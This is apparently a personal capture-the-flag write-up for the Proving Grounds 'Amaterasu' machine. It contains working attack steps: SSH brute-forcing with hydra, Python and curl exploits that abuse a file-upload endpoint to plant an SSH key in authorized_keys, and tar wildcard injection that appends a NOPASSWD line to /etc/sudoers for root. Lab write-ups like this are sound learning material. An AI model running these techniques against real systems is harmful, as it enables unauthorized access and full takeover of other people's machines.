[<- home](/)

# Amaterasu [PG Play]

<sub>_This is a raw write-up. It accounts for every step taken throughout the challenge, whether or not it was successful. So, expect a lot of rabbitholes and frustration. At the time of writing this, I don't even know if I've solved the challenge myself. You might see a flag somewhere titled **<sup>Assisted by [write-up link]</sup>** which means I used someone else's write-up to complete the challenge. Being a responsible learner, I'm trying my best to accept as little help as possible and only when I'm out of ideas._</sub> 

## _Manual Exploitation_

Let's define the target machine's IP address in a variable:

```
targ3t=192.168.151.249
```

Let's see what `nmap` can show us about this target:

```
nmap -A $targ3t -oN general.scan -vv
```

Seems like we have only one open port `21` for `ftp`. Anonymous FTP login is allowed, let's take a look inside. 

```
ftp $targ3t 21
```

Logged in as anonymous successfully, but when I type `ls` command or `dir` command, it gives the following error:

```
229 Entering Extended Passive Mode (|||44906|)
```

I tried researching this error and it seems to be the issue with the version of `vsftpd` currently in use (`3.0.3`). Let's find if anything's wrong with it, that we can use to our advantage:

```
searchsploit vsftpd
```

Nothing but a DoS exploit is available for this one. I couldn't find anything online either.

I ran `status` command in the ftp for this target:

```
status
```

And I'm planning to investigate every line of this to see if we can change something. But first, I'll run a couple of different `nmap` scans just in case:

```
nmap -A -p- $targ3t -oN general_new.scan -vv
nmap --script=ftp-* $targ3t -p21 -vv -oN ftp.scan
```

We received a couple more open ports from the first scan, let's see what they are.

- `25022/tcp` is an `ssh` port, only this one's open compared to the `22/tcp`. 
- `33414/tcp` is an `http` port running `Werkzeug httpd 2.2.3`.
-  `40080/tcp` is an `http` port running `Apache httpd 2.4.53`.

Let's check the http ports:

```
firefox http://$targ3t:33414
```

This doesn't have any homepage, but the port is definitely up. Let's put it through `feroxbuster` to find out if there are any other paths through it:

```
feroxbuster -u http://$targ3t:33414 -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -o ferox_33414.scan
```

It seems like there are `/info` and `/help` paths. They tell us:

- There's a user named `Alfredo Moroder`.
- There's a path `/file-list?dir=/tmp` that can list files and directories on the target system just by modifying the `/tmp` bit. 
- Through there we can see that the user's username on the system is `alfredo`. 
- Through a path `/file-upload` we should be able to upload files via POST requests.

Obviously that last bit is very exciting, but let's try to brute-force his `ssh` via `hydra`, using `alfredo` as a username and `rockyou.txt` wordlist. The nmap scan didn't show that password login is specifically prohibited, so let's try:

```
hydra -l alfredo -P /usr/share/wordlists/rockyou.txt $targ3t -s 25022 ssh -vV
```

After this is done and we couldn't get any results, or escalate privileges for a root flag, let's try uploading a reverse shell. We know this web environment is running Python so uploading a Python reverse shell should work. 

It appears that password for `alfredo` user isn't available in `rockyou.txt` wordlist. I imagine other wordlists won't give us better results. 

Going to the path: `/info` on this port, it states that this is a Python REST Api v2.5. Quick google search tells us, that file upload is handled here via a `file` parameter in the query string of a `POST` request.

Let's try to exploit the `/file-upload` path, that seemingly allows `POST` requests to upload files:

```
curl -X POST http://$targ3t:33414/file-upload -F 'file=/home/kali/Documents/test.txt' -vv
```

The response message states: `{"message":"No file part in the request"}`. Going through some of the google search results it is also mentioned, that `@` is needed before the path:

```
curl -X POST http://$targ3t:33414/file-upload -F 'file=@/home/kali/Documents/test.txt' -vv
```

The response message changed slightly: `{"message":"No filename part in the request"}`. Moving on, let's include filename parameter:

```
curl -X POST http://$targ3t:33414/file-upload -F 'file=@/home/kali/Documents/test.txt;filename=@test.txt' -vv
```

We get the same response message and other iterations don't seem to work very well. Let's try to write a python script, that will achieve the same result only using the `requests` library:

```
import requests

file_path = "/home/kali/Downloads/test.txt

with open(file_path, 'rb') as file:
    files = {'file': file}
    r = requests.post('http://$targ3t:33414/file_upload', files=files)

print("Status Code: ", r.status_code)
print("Response Body: ", r.text)
```

When running this script it returns the second response message of: `{"message":"No filename part in the request"}` so to explicitly declare the filename I tried some ways I found on various google search results, including some stackoverflow questions and made the following changes to the code:

```
import requests

file_path = "/home/kali/Downloads/test.txt

with open(file_path, 'rb') as file:
    files = {"file": (file_path, file), "filename": "@test.pdf"}
    r = requests.post('http://$targ3t:33414/file_upload', files=files)

print("Status Code: ", r.status_code)
print("Response Body: ", r.text)
```

Unfortunately, this returned the same response body. Looking through the google search results I came across this fairly recent [article](https://www.comtrade360.com/insights/file-streaming-rest-api-python/). This gives a detailed guide on how to handle `multipart/form-data` `POST` requests. So the next iteration of my code looks like this:

```
import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder

file_path = "/home/kali/Downloads/test.txt"

encoded_data = MultipartEncoder(
    fields = {
        "id": "some-id",
        "file": ("test.txt", open(file_path, 'rb'), "text/plain"),
        "filename": "test.txt",
    }
)

r = requests.post (
    "http://192.168.147.249:33414/file-upload",
    data=encoded_data,
    headers={"Content-Type": encoded_data.content_type},
)

print("Status Code: ", r.status_code)
print("Response Body: ", r.text)
```

When I ran this script: `{"message":"File successfully uploaded"}`. I went to quickly check where the file ended up. Navigating to `/file-list?dir=/tmp` it is right there in the `/tmp` directory. I wonder if I can upload a reverse shell to the `/var/www/html` directory so that we can call it from the http port `40080`. For that reason I added the following code:

```
dst_path = input("Enter the destination path: ")

...

...
    ...
        ...
        "file": (dst_path, open(file_path, 'rb'), "text/plain"),
        "filename": dst_path,
        ...

```

This way I will be prompted to add destination path on the server's file system so that I can play around with it:

```
python exploit.py
Enter the destination path: /var/www/html/test.txt
Status Code: 500
```

We received Internal Server Error, let's try user's home directory: `/home/alfredo`:

```
python exploit.py
Enter the destination path: /home/alfredo/test.txt
Status Code: 201
Response Body: {"message":"File successfully uploaded"}
```

Checking on the whereabouts of this file, it was indeed uploaded in the user's home directory! Apparently `/var/www/html` is off-limits for us as we don't have permissions to upload files to it. 

There is an `.ssh` directory at `/home/alfredo` with `id_rsa` and `id_rsa.pub` in them, which alfredo uses to log into his machine, no doubt. We cannot download them unfortunately, but I wonder if we can replace them. First on local machine:

```
ssh-keygen
```

This generated two files in the directory I manually designated: `id_ed25519` and `id_ed25519.pub`. I'm going to modify my exploit code so that it prompts me not only for destination path by original file path as well and run it again:

```
python exploit.py
Enter the destination path: /home/alfredo/.ssh/id_rsa.pub
Enter the origin file path: /home/kali/Workspace/id_ed25519
Status Code: 400
Response Body: {"message":"Allowed file types are txt, pdf, png, jpg, jpeg, gif"}
```

Let's change the extension to this file upon destination:

```
python exploit.py
Enter the destination path: /home/alfredo/.ssh/id_rsa.pub.txt
Enter the origin file path: /home/kali/Workspace/id_ed255519
```

This one was successfuly and the file was indeed there. Let's try logging in:

```
ssh -i id_ed25519 alfredo@$targ3t -p 25022
```

It prompts for a password, the access is still denied. I guess it was worth a shot. 

Somehow I still think this is somehow the right way to gain foothold on this machine, it's just missing something. I'm tempted to give various scanners a shot at this:

```
dirsearch -u $targ3t:33414 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Nothing particularly different. I give up.

_<sup>Assited by [write-up](https://medium.com/@cyberarri/amaterasu-pg-play-writeup-fe85417de271):</sup>_ Okay, so apparently I was onto something, but didn't quite get the bullseye. A painful lesson, that: 

I need to upload my `id_rsa.pub` key to `/home/alfredo/.ssh/authorized_keys` as `id_rsa.txt` not a in the directory one level up as I did previously:

```
python3 exploit.py
Enter the destination path: /home/alfredo/.ssh/authorized_keys/id_rsa.txt
Enter the origin file path: /home/kali/Workspace/pg_play_amaterasu/id_rsa.pub.txt
```

This returns an error. Not sure why, but I'll follow up on this later, I'll try the curl one-liner that is in the write-up for now:

```
curl -i -L -X POST -H "Content-Type: multipart/form-data" -F file="@//home/kali/Workspace/pg_play_amaterasu/id_rsa.pub.txt" -F filename="/home/alfredo/.ssh/authorized_keys" http://$targ3t:33414/file-upload
```

And it worked!

```
ssh -i id_rsa.txt alfredo@targ3t -p 25022
```

We're in, get the `local.txt` flag:

```
cat local.txt
```

I looked into my Python code and applied a possible fix that makes it work just like the `curl` one-liner above:

```
import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder

with open("/home/parabellum/Workspace/pg_play_amaterasu/id_rsa.pub.txt", 'rb') as f:
    encoded_data = MultipartEncoder(
        fields={
            "file": ("id_rsa.pub.txt", f, "text/plain"),
            "filename": "/home/alfredo/.ssh/authorized_keys"
        }
    )

    r = requests.post(
        "http://192.168.125.249:33414/file-upload",
        data=encoded_data,
        headers={"Content-Type": encoded_data.content_type},
    )

print("Status Code:", r.status_code)
print("Response Body:", r.text)
```

Now let's see if we can escalate some privileges:

```
find / -perm /4000 2>/dev/null
```

I went through the entire list and none of these seems to be applicable to the current user. Let's check the `crontab`:

```
cat /etc/crontab
```

There is a script running by root in `/usr/local/bin/backup-flask.sh`. Let's see what it does:

```
cat /usr/local/bin/backup-flask.sh
```

It adds `/home/alfredo/restapi` to PATH environment variable, then goes to that path and executes `tar czf /tmp/flask.tar.gz *`, or in other words compresses everything in `/home/alfredo/restapi` into `/tmp/flask.tar.gz`. There is a way to exploit that `*` wildcard:

```
echo "" > '--checkpoint=1'
echo "" > '--checkpoint-action=exec=sh privesc.sh'
```

These will be saved as files, only every time the `tar` command runs in the script it will execute `sh privesc.sh`, which will be in the same directory and have the following contents:

```
#!/bin/bash

echo 'alfredo ALL=(root) NOPASSWD: ALL' >> /etc/sudoers
```

After a minute if we check our sudo permissions:

```
sudo -l
```

We will find, that we can use sudo without password now:

```
sudo su
```

This starts a root shell:

```
cat /root/proof.txt
```

This is our root flag!
